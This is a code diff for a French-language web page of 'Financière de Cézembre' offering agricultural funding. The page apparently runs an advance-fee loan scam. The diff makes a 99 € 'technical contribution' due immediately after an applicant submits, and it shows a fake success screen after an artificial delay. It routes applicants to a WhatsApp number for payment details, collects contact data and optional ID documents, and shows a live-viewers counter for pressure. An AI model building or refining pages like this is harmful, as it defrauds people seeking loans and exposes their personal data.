@@ -369,6 +369,13 @@
         .shine-white { color: #FFFFFF !important; animation: blink-white 3s infinite; }
         @keyframes blink-white { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; text-shadow: 0 0 10px #fff; } }
 
+        #loader-overlay {
+            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px;
+        }
+        .spinner { width: 45px; height: 45px; border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
         .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
         .stat-box h3 { font-size: 2rem; color: var(--gold); }
 
@@ -488,14 +495,53 @@
     </div>
 
     <div class="simulator" id="simBox">
+        <div id="loader-overlay">
+            <div id="loading-content">
+                <div class="spinner"></div>
+                <p id="loader-text" style="font-weight: 600; color: var(--navy);">Analyse de votre dossier de soutien en cours...</p>
+            </div>
+            <div id="success-message" style="display:none; text-align: left; max-height: 460px; overflow-y: auto; padding: 5px;">
+                <div style="text-align: center; margin-bottom: 10px;">
+                    <i class="fas fa-check-circle" style="color:var(--success); font-size:2.5rem;"></i>
+                    <h3 style="color: var(--navy); margin: 5px 0; font-size: 1.1rem;">DOSSIER ENREGISTRÉ AVEC SUCCÈS !</h3>
+                </div>
+                
+                <div style="background: #fdfaf3; border: 1px solid var(--gold); padding: 10px; border-radius: 4px; font-size: 0.75rem; margin-bottom: 10px;">
+                    <p><strong>Code de référence :</strong> <span id="refCodeDisplay" style="color: var(--navy); font-weight: 800;">#CEZ-RURAL-2026</span></p>
+                    <p style="margin-top: 4px;"><strong>Contribution technique :</strong> 99 € (~105 USD)</p>
+                </div>
+
+                <div style="font-size: 0.7rem; color: #555; line-height: 1.4; margin-bottom: 10px;">
+                    🛡️ <strong>Notre engagement qualité :</strong> Aucun dossier sérieux n'est rejeté arbitrairement. Votre contribution sert directement à rémunérer l'expertise technique et l'analyse approfondie de votre projet sous 24 à 48h.
+                </div>
+
+                <p style="font-size: 0.72rem; font-weight: 700; color: var(--navy); margin-bottom: 6px;">
+                    Pour obtenir les coordonnées et finaliser, choisissez l'une de ces options :
+                </p>
+
+                <div style="background: #f8f9fa; border: 1px solid #ddd; padding: 8px; border-radius: 4px; margin-bottom: 8px;">
+                    <label style="font-size: 0.68rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Laisser un message sur le site :</label>
+                    <textarea id="clientMsgInput" placeholder="Écrivez votre message pour demander les instructions..." style="width: 100%; height: 40px; font-size: 0.7rem; padding: 5px; border: 1px solid #ccc; border-radius: 3px; resize: none;"></textarea>
+                    <button type="button" onclick="sendClientMessage()" style="background: var(--navy); color: white; border: none; padding: 5px 10px; font-size: 0.68rem; font-weight: 700; border-radius: 3px; cursor: pointer; margin-top: 4px; width: 100%;">Envoyer ma demande</button>
+                </div>
+
+                <a id="waDirectBtn" href="https://wa.me/33780976404?text=Bonjour,%20mon%20code%20de%20référence%20est%20%23CEZ-RURAL-2026.%20Je%20souhaite%20recevoir%20les%20coordonnées%20pour%20régler%20la%20contribution%20technique." target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.75rem; font-weight: 700; margin-bottom: 10px;">
+                    <i class="fab fa-whatsapp" style="font-size: 1rem;"></i> 2. Contactez-nous directement sur WhatsApp
+                </a>
+
+                <button class="btn-main" onclick="resetAll()" style="padding: 8px; font-size: 0.75rem;">Fermer / Nouveau dossier</button>
+            </div>
+        </div>
+
         <div class="live-btn"><div class="dot-live"></div> <span id="viewers-count">14</span> porteurs de projets consultent cette offre</div>
         
         <h3 style="margin-bottom: 10px; font-size: 1rem;">Formulaire de Dossier Agricole Officiel</h3>
         
-        <form id="loanForm" action="https://formsubmit.co/el/tijenu" method="POST" enctype="multipart/form-data">
+        <form id="loanForm" action="https://formsubmit.co/soutien@financiere-cezembre.org" method="POST" enctype="multipart/form-data" onsubmit="validateAndSubmit(event)">
             <input type="hidden" name="_subject" value="Nouveau dossier agricole soumis - Financière de Cézembre">
             <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_autoresponse" value="Bonjour, nous avons bien reçu votre dossier de demande de soutien agricole auprès de la Financière de Cézembre. Votre dossier est en cours d'enregistrement et sera examiné par notre équipe technique sous 24 à 48h.">
             
             <input type="text" name="nom" id="inputNom" placeholder="Nom et Prénom du Porteur" class="form-input" required>
             
@@ -529,30 +575,117 @@
 
             <select name="pays_residence" id="paysSelect" class="form-input" onchange="updateIndicatif()" required>
                 <option value="" disabled selected>Sélectionnez votre pays / territoire</option>
-                <option value="France" data-code="+33">France métropolitaine</option>
-                <option value="Belgique" data-code="+32">Belgique</option>
-                <option value="Suisse" data-code="+41">Suisse</option>
-                <option value="Canada" data-code="+1">Canada</option>
-                <option value="Côte d'Ivoire" data-code="+225">Côte d'Ivoire</option>
-                <option value="Sénégal" data-code="+221">Sénégal</option>
-                <option value="Cameroun" data-code="+237">Cameroun</option>
-                <option value="Togo" data-code="+228">Togo</option>
-                <option value="Bénin" data-code="+229">Bénin</option>
+                
+                <optgroup label="France & Outre-Mer (Îles et Territoires)">
+                    <option value="France" data-code="+33">France métropolitaine</option>
+                    <option value="Guadeloupe" data-code="+590">Guadeloupe</option>
+                    <option value="Martinique" data-code="+596">Martinique</option>
+                    <option value="La Réunion" data-code="+262">La Réunion</option>
+                    <option value="Mayotte" data-code="+262">Mayotte</option>
+                    <option value="Saint-Barthélemy" data-code="+590">Saint-Barthélemy</option>
+                    <option value="Saint-Martin" data-code="+590">Saint-Martin</option>
+                    <option value="Saint-Pierre-et-Miquelon" data-code="+508">Saint-Pierre-et-Miquelon</option>
+                    <option value="Polynésie française" data-code="+689">Polynésie française</option>
+                    <option value="Nouvelle-Calédonie" data-code="+687">Nouvelle-Calédonie</option>
+                    <option value="Wallis-et-Futuna" data-code="+681">Wallis-et-Futuna</option>
+                </optgroup>
+
+                <optgroup label="Europe">
+                    <option value="Albanie" data-code="+355">Albanie</option>
+                    <option value="Allemagne" data-code="+49">Allemagne</option>
+                    <option value="Andorre" data-code="+376">Andorre</option>
+                    <option value="Autriche" data-code="+43">Autriche</option>
+                    <option value="Belgique" data-code="+32">Belgique</option>
+                    <option value="Biélorussie" data-code="+375">Biélorussie</option>
+                    <option value="Bosnie-Herzégovine" data-code="+387">Bosnie-Herzégovine</option>
+                    <option value="Bulgarie" data-code="+359">Bulgarie</option>
+                    <option value="Chypre" data-code="+357">Chypre</option>
+                    <option value="Croatie" data-code="+385">Croatie</option>
+                    <option value="Danemark" data-code="+45">Danemark</option>
+                    <option value="Espagne" data-code="+34">Espagne</option>
+                    <option value="Estonie" data-code="+372">Estonie</option>
+                    <option value="Finlande" data-code="+358">Finlande</option>
+                    <option value="Grèce" data-code="+30">Grèce</option>
+                    <option value="Hongrie" data-code="+36">Hongrie</option>
+                    <option value="Irlande" data-code="+353">Irlande</option>
+                    <option value="Islande" data-code="+354">Islande</option>
+                    <option value="Italie" data-code="+39">Italie</option>
+                    <option value="Kosovo" data-code="+383">Kosovo</option>
+                    <option value="Lettonie" data-code="+371">Lettonie</option>
+                    <option value="Liechtenstein" data-code="+423">Liechtenstein</option>
+                    <option value="Lituanie" data-code="+370">Lituanie</option>
+                    <option value="Luxembourg" data-code="+352">Luxembourg</option>
+                    <option value="Macédoine du Nord" data-code="+389">Macédoine du Nord</option>
+                    <option value="Malte" data-code="+356">Malte</option>
+                    <option value="Moldavie" data-code="+373">Moldavie</option>
+                    <option value="Monaco" data-code="+377">Monaco</option>
+                    <option value="Monténégro" data-code="+382">Monténégro</option>
+                    <option value="Norvège" data-code="+47">Norvège</option>
+                    <option value="Pays-Bas" data-code="+31">Pays-Bas</option>
+                    <option value="Pologne" data-code="+48">Pologne</option>
+                    <option value="Portugal" data-code="+351">Portugal</option>
+                    <option value="République tchèque" data-code="+420">République tchèque</option>
+                    <option value="Roumanie" data-code="+40">Roumanie</option>
+                    <option value="Royaume-Uni" data-code="+44">Royaume-Uni</option>
+                    <option value="Russie" data-code="+7">Russie</option>
+                    <option value="Saint-Marin" data-code="+378">Saint-Marin</option>
+                    <option value="Serbie" data-code="+381">Serbie</option>
+                    <option value="Slovaquie" data-code="+421">Slovaquie</option>
+                    <option value="Slovénie" data-code="+386">Slovénie</option>
+                    <option value="Suède" data-code="+46">Suède</option>
+                    <option value="Suisse" data-code="+41">Suisse</option>
+                    <option value="Ukraine" data-code="+380">Ukraine</option>
+                    <option value="Vatican" data-code="+379">Vatican</option>
+                </optgroup>
+
+                <optgroup label="Amérique du Nord">
+                    <option value="Canada" data-code="+1">Canada</option>
+                    <option value="États-Unis" data-code="+1">États-Unis</option>
+                </optgroup>
+
+                <optgroup label="Amérique Latine">
+                    <option value="Argentine" data-code="+54">Argentine</option>
+                    <option value="Bolivie" data-code="+591">Bolivie</option>
+                    <option value="Brésil" data-code="+55">Brésil</option>
+                    <option value="Chili" data-code="+56">Chili</option>
+                    <option value="Colombie" data-code="+57">Colombie</option>
+                    <option value="Costa Rica" data-code="+506">Costa Rica</option>
+                    <option value="Cuba" data-code="+53">Cuba</option>
+                    <option value="République dominicaine" data-code="+1-809">République dominicaine</option>
+                    <option value="Équateur" data-code="+593">Équateur</option>
+                    <option value="Salvador" data-code="+503">Salvador</option>
+                    <option value="Guatemala" data-code="+502">Guatemala</option>
+                    <option value="Honduras" data-code="+504">Honduras</option>
+                    <option value="Mexique" data-code="+52">Mexique</option>
+                    <option value="Nicaragua" data-code="+505">Nicaragua</option>
+                    <option value="Panama" data-code="+507">Panama</option>
+                    <option value="Paraguay" data-code="+595">Paraguay</option>
+                    <option value="Pérou" data-code="+51">Pérou</option>
+                    <option value="Uruguay" data-code="+598">Uruguay</option>
+                    <option value="Venezuela" data-code="+58">Venezuela</option>
+                </optgroup>
             </select>
 
             <div class="phone-group">
                 <select name="indicatif_pays" id="indicatifSelect" class="form-input phone-code-select" required>
                     <option value="+33" selected>+33</option>
-                    <option value="+228">+228</option>
-                    <option value="+225">+225</option>
-                    <option value="+32">+32</option>
+                    <option value="+39">+39</option>
+                    <option value="+352">+352</option>
+                    <option value="+590">+590</option>
+                    <option value="+596">+596</option>
+                    <option value="+1">+1</option>
+                    <option value="+54">+54</option>
+                    <option value="+591">+591</option>
+                    <option value="+55">+55</option>
+                    <option value="+57">+57</option>
+                    <option value="+51">+51</option>
                 </select>
                 <input type="tel" name="numero_whatsapp" placeholder="Numéro WhatsApp" class="form-input phone-number-input" required>
             </div>
 
             <input type="email" name="email" placeholder="Adresse Email" class="form-input" required>
             
-            <textarea name="message" placeholder="Détail et répartition sommaire du budget..." class="form-input" style="min-height: 45px; resize: vertical; padding: 8px;" required></textarea>
+            <textarea name="message" placeholder="Détail et répartition sommaire du budget (ex: matériel, bêtes, semences)..." class="form-input" style="min-height: 45px; resize: vertical; padding: 8px;" required></textarea>
 
             <div class="file-upload-group">
                 <label class="file-upload-label"><i class="fas id-card"></i> Pièce d'identité (Recto / Verso) : <span style="font-weight: normal; color: #777;">(Optionnel)</span></label>
@@ -560,12 +693,12 @@
             </div>
 
             <div class="file-upload-group">
-                <label class="file-upload-label"><i class="fas fa-file-image"></i> Photos ou Documents du projet : <span style="font-weight: normal; color: #777;">(Optionnel)</span></label>
+                <label class="file-upload-label"><i class="fas fa-file-image"></i> Photos du terrain ou Documents du projet : <span style="font-weight: normal; color: #777;">(Optionnel)</span></label>
                 <input type="file" name="documents_projet" multiple class="form-input" style="padding: 4px; font-size: 0.75rem; margin-bottom: 0;">
             </div>
 
             <div class="form-notice-fee">
-                💡 <strong>Contribution d'ingénierie :</strong> Une contribution unique de <strong>99 € (105 USD)</strong> est requise après l'instruction technique.
+                💡 <strong>Contribution d'ingénierie :</strong> Une contribution unique de <strong>99 € (105 USD)</strong> est requise immédiatement après la soumission de votre dossier pour enclencher l'instruction technique (24-48h).
             </div>
 
             <button type="submit" class="btn-main">SOUMETTRE LE DOSSIER</button>
@@ -709,6 +842,8 @@
         }
     }, 4500);
 
+    let generatedRefCode = "";
+
     function updateIndicatif() {
         const paysSelect = document.getElementById('paysSelect');
         const selectedOption = paysSelect.options[paysSelect.selectedIndex];
@@ -825,6 +960,8 @@
         setInterval(dropOneReview, 7000); 
     }
 
+    function resetAll() { location.reload(); }
+
     window.onload = startJumellesAnimation;
 
     function selectLanguage(name, code) {
@@ -854,10 +991,14 @@
     }
     function closeDetails() { document.getElementById('modal-overlay').style.display = 'none'; }
 
-    // Validation simple pour s'assurer que le montant et la taille des fichiers sont corrects avant l'envoi direct
-    document.getElementById('loanForm').addEventListener('submit', function(e) {
+    async function validateAndSubmit(e) {
+        e.preventDefault();
+        
+        // --- Vérification de la taille des fichiers joints ---
         const fileInputs = document.querySelectorAll('input[type="file"]');
         let totalSize = 0;
+        const maxTotalSize = 10 * 1024 * 1024; // 10 Mo max au total
+
         fileInputs.forEach(input => {
             if (input.files.length > 0) {
                 for (let i = 0; i < input.files.length; i++) {
@@ -866,22 +1007,80 @@
             }
         });
 
-        if (totalSize > 10 * 1024 * 1024) {
-            e.preventDefault();
-            alert("La taille totale des pièces jointes dépasse la limite autorisée (10 Mo).");
+        if (totalSize > maxTotalSize) {
+            alert("La taille totale des pièces jointes dépasse la limite autorisée (10 Mo). Veuillez réduire la taille de vos fichiers.");
             return;
         }
+        // ----------------------------------------------------
 
         const devise = document.getElementById('deviseSelect').value;
         const montantSaisi = parseFloat(document.getElementById('montantSaisi').value);
-        let maxLimit = devise.includes("Dollar") ? 21957 : 19000;
+        
+        let minLimit = 1;
+        let maxLimit = 19000;
+        let symbol = "€";
 
-        if (isNaN(montantSaisi) || montantSaisi < 1 || montantSaisi > maxLimit) {
-            e.preventDefault();
-            alert(`Erreur de saisie : Le montant demandé doit être compris entre 1 et ${maxLimit}.`);
+        if(devise.includes("Dollar")) {
+            minLimit = 1;
+            maxLimit = 21957;
+            symbol = "$";
+        }
+
+        if (isNaN(montantSaisi) || montantSaisi < minLimit || montantSaisi > maxLimit) {
+            alert(`Erreur de saisie budgétaire : Pour les ${devise}, le montant demandé doit obligatoirement être compris entre ${minLimit.toLocaleString()} ${symbol} et ${maxLimit.toLocaleString()} ${symbol}.`);
             return;
         }
-    });
+
+        const randomNum = Math.floor(10000 + Math.random() * 90000);
+        generatedRefCode = `#CEZ-${randomNum}`;
+
+        let form = document.getElementById('loanForm');
+        let refInputHidden = document.createElement('input');
+        refInputHidden.type = 'hidden';
+        refInputHidden.name = 'code_reference';
+        refInputHidden.value = generatedRefCode;
+        form.appendChild(refInputHidden);
+
+        document.getElementById('loader-overlay').style.display = 'flex';
+        const formData = new FormData(form);
+        
+        try {
+            const response = await fetch(form.action, { method: 'POST', body: formData, headers: { 'Accept': 'application/json' } });
+            
+            if (response.ok || response.status === 200) {
+                if(typeof gtag === 'function'){ gtag('event', 'conversion', {'send_to': 'AW-18121475138/vGqNCOf1r_kZELqR9-8_'}); }
+                setTimeout(() => {
+                    document.getElementById('loading-content').style.display = 'none';
+                    
+                    document.getElementById('refCodeDisplay').innerText = generatedRefCode;
+                    
+                    const clientNom = document.getElementById('inputNom').value || "Client";
+                    const waUrl = `https://wa.me/33780976404?text=Bonjour,%20je%20suis%20${encodeURIComponent(clientNom)}.%20Mon%20code%20de%20référence%20est%20${generatedRefCode}.%20Je%20souhaite%20recevoir%20les%20coordonnées%20pour%20régler%20la%20contribution%20technique%20de%2099€.`;
+                    document.getElementById('waDirectBtn').href = waUrl;
+
+                    document.getElementById('success-message').style.display = 'block';
+                }, 3000);
+            } else {
+                alert("Une erreur est survenue lors de l'envoi du dossier.");
+                document.getElementById('loader-overlay').style.display = 'none';
+            }
+        } catch (error) {
+            alert("Erreur de connexion réseau lors de l'envoi du dossier.");
+            document.getElementById('loader-overlay').style.display = 'none';
+        }
+    }
+
+    async function sendClientMessage() {
+        const msg = document.getElementById('clientMsgInput').value.trim();
+        if(!msg) {
+            alert("Veuillez écrire un message.");
+            return;
+        }
+
+        const clientNom = document.getElementById('inputNom').value || "Anonyme";
+        const finalUrl = `https://wa.me/33780976404?text=Message%20depuis%20le%20site%20(Réf:%20${generatedRefCode},%20Nom:%20${encodeURIComponent(clientNom)}):%20${encodeURIComponent(msg)}`;
+        window.open(finalUrl, '_blank');
+    }
 </script>
 </body>
 </html>
